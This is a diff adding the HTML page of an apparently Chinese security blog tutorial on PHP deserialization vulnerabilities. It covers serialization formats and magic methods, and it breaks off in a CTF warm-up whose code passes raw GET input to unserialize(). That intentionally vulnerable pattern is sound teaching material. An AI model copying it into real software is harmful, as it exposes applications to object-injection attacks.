@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/analysis-of-php-deserialization-vulnerabilities.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="浅析PHP反序列化漏洞 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="浅析PHP反序列化漏洞 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="浅析PHP反序列化漏洞 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。 0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对">
+    <meta property="og:description" content="0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。 0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对">
+    <meta property="twitter:description" content="0x01 前言 很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。 0x02 PHP序列化和反序列化基础 我们想要将数组值存储到数据库时，就可以对">
+    <meta property="og:type" content="article">
+    <title>浅析PHP反序列化漏洞 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/analysis-of-php-deserialization-vulnerabilities.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/analysis-of-php-deserialization-vulnerabilities.html" title="浅析PHP反序列化漏洞">浅析PHP反序列化漏洞</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2019-06-05 17:00:57 UTC">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 05 Jun 2019
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            4368 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            9 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x01-前言">0x01 前言</a></li>
+    <li><a href="#0x02-php序列化和反序列化基础">0x02 PHP序列化和反序列化基础</a>
+      <ul>
+        <li><a href="#php序列化serialize">PHP序列化：serialize</a></li>
+        <li><a href="#php反序列化unserialize">PHP反序列化：unserialize</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-常见魔术方法">0x03 常见魔术方法</a>
+      <ul>
+        <li><a href="#__sleep">__sleep()</a></li>
+        <li><a href="#__wakeup">__wakeup()</a></li>
+        <li><a href="#__construct">__construct</a></li>
+        <li><a href="#__destruct">__destruct()</a></li>
+        <li><a href="#__tostring">__ToString()</a></li>
+        <li><a href="#热身题">热身题</a></li>
+        <li><a href="#反序列化对象注入-cve-2016-7124">反序列化对象注入-CVE-2016-7124</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-session反序列化漏洞">0x04 session反序列化漏洞</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#存储机制">存储机制</a></li>
+        <li><a href="#php-session中的序列化危害">PHP Session中的序列化危害</a></li>
+        <li><a href="#jarvisoj-web的一道session反序列化">jarvisoj-web的一道SESSION反序列化</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x05-参考">0x05 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x01-前言">0x01 前言</h1>
+<p>很久没有些文章了，今天复习了反序列化漏洞的知识，顺便写了一篇文章。</p>
+<h1 id="0x02-php序列化和反序列化基础">0x02 PHP序列化和反序列化基础</h1>
+<p>我们想要将数组值存储到数据库时，就可以对数组进行序列化操作，然后将序列化后的值存储到数据库中。其实PHP序列化数组就是将复杂的数组数据类型转换为字符串，方便数组存库操作。对PHP数组进行序列化和反序列化操作，主要就用到两个函数，serialize和unserialize。</p>
+<h2 id="php序列化serialize">PHP序列化：serialize</h2>
+<p>在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。</p>
+<p>序列化函数原型如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">string</span> <span class="nx">serialize</span> <span class="p">(</span> <span class="nx">mixed</span> <span class="nv">$value</span> <span class="p">)</span>
+</span></span></code></pre></div><p>先看个例子</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span> <span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TEST</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$pass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">pass</span> <span class="o">=</span> <span class="nv">$pass</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$number</span> <span class="o">=</span> <span class="mi">34</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;user&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$bool</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$null</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">=&gt;</span> <span class="mi">10</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">=&gt;</span> <span class="mi">200</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TEST</span><span class="p">(</span><span class="s1">&#39;uu&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$number</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$bool</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$null</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>输出结果为：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/1.png" alt=""></p>
+<p>所以序列化对于不同类型得到的字符串格式为：</p>
+<ul>
+<li><code>String</code> : s:size:value;</li>
+<li><code>Integer</code> : i:value;</li>
+<li><code>Boolean</code> : b:value;(保存1或0)</li>
+<li><code>Null</code> : N;</li>
+<li><code>Array</code> : a:size:{key definition;value definition;(repeated per element)}</li>
+<li><code>Object</code> : O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}</li>
+</ul>
+<p>从上面最后一个结果有个问题，为什么会出现不明符号，因为变量是private的所以序列号的时候会在两侧加入空字节，而且是private属性的变量都会在变量前面加上加上类名。</p>
+<h2 id="php反序列化unserialize">PHP反序列化：unserialize</h2>
+<p>unserialize() 是对单一的已序列化的变量进行操作，将其转换回PHP 的值。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">mixed</span> <span class="nx">unserialize</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$str</span> <span class="p">)</span>
+</span></span></code></pre></div><p>例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;O:4:&#34;TEST&#34;:2:{s:4:&#34;data&#34;;s:2:&#34;uu&#34;;s:10:&#34; TEST pass&#34;;b:1;}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>输出结果为：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/2.png" alt=""></p>
+<h1 id="0x03-常见魔术方法">0x03 常见魔术方法</h1>
+<p>在利用对PHP序列号和反序列化时，都需要经过当中的魔术方法，检查方法里有无敏感操作来进行利用。</p>
+<p><strong>常见方法</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__construct()//创建对象时触发
+</span></span><span class="line"><span class="cl">__destruct() //对象被销毁时触发
+</span></span><span class="line"><span class="cl">__call() //在对象上下文中调用不可访问的方法时触发
+</span></span><span class="line"><span class="cl">__callStatic() //在静态上下文中调用不可访问的方法时触发
+</span></span><span class="line"><span class="cl">__get() //用于从不可访问的属性读取数据
+</span></span><span class="line"><span class="cl">__set() //用于将数据写入不可访问的属性
+</span></span><span class="line"><span class="cl">__isset() //在不可访问的属性上调用isset()或empty()触发
+</span></span><span class="line"><span class="cl">__unset() //在不可访问的属性上使用unset()时触发
+</span></span><span class="line"><span class="cl">__invoke() //当脚本尝试将对象调用为函数时触发
+</span></span></code></pre></div><h2 id="__sleep">__sleep()</h2>
+<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。<code>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</code></p>
+<p>看个例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">SITE</span> <span class="o">=</span> <span class="s1">&#39;uusama&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$nickname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="nv">$nickname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 重载序列化调用的方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// 返回需要序列化的变量名，过滤掉password变量
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;nickname&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s1">&#39;uusama&#39;</span><span class="p">,</span> <span class="s1">&#39;uu&#39;</span><span class="p">,</span> <span class="s1">&#39;123456&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
+</span></span></code></pre></div><p>输出的结果很显然序列化的时候忽略了 password 字段的值。</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/3.png" alt=""></p>
+<h2 id="__wakeup">__wakeup()</h2>
+<p>unserialize() 会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup() </code>方法，预先准备对象需要的资源。</p>
+<p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
+<p>看个例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="no">SITE</span> <span class="o">=</span> <span class="s1">&#39;uusama&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$nickname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$order</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">nickname</span> <span class="o">=</span> <span class="nv">$nickname</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$password</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// 定义反序列化后调用的方法
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$user_ser</span> <span class="o">=</span> <span class="s1">&#39;O:4:&#34;User&#34;:2:{s:8:&#34;username&#34;;s:6:&#34;uusama&#34;;s:8:&#34;nickname&#34;;s:2:&#34;uu&#34;;}&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$user_ser</span><span class="p">));</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/4.png" alt=""></p>
+<ul>
+<li><code>__wakeup()</code>函数在对象被构建以后执行，所以$this-&gt;username的值不为空</li>
+<li>反序列化时，会尽量将变量值进行匹配并复制给序列化后的对象</li>
+</ul>
+<h2 id="__construct">__construct</h2>
+<p><code>__construct()</code>被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。</p>
+<p>例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$nickname</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="nv">$username</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__construct test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="s2">&#34;F0rmat&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>输出结果：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/5.png" alt=""></p>
+<h2 id="__destruct">__destruct()</h2>
+<p>对象的所有引用都被删除或者当对象被显式销毁时执行<code>__destruct()</code></p>
+<p>例子:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;__destruct test&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>	  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$test</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>输出结果：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/6.png" alt=""></p>
+<h2 id="__tostring">__ToString()</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="nx">__toString</span> <span class="p">(</span> <span class="nx">void</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">string</span>
+</span></span></code></pre></div><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.tostring">__toString()</a> 方法用于一个类被当成字符串时应怎样回应。例如 <em>echo $obj;</em> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 <strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误。</p>
+<p>例子：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TestClass</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$foo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$foo</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">foo</span> <span class="o">=</span> <span class="nv">$foo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">foo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$class</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">TestClass</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$class</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>输出的结果：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/unserialize/7.png" alt=""></p>
+<h2 id="热身题">热身题</h2>
+<p><a href="http://120.79.33.253:9001/">http://120.79.33.253:9001/</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$KEY</span> <span class="o">=</span> <span class="s2">&#34;D0g3!!!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">===</span> <span class="s2">&#34;</span><span class="si">$KEY</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
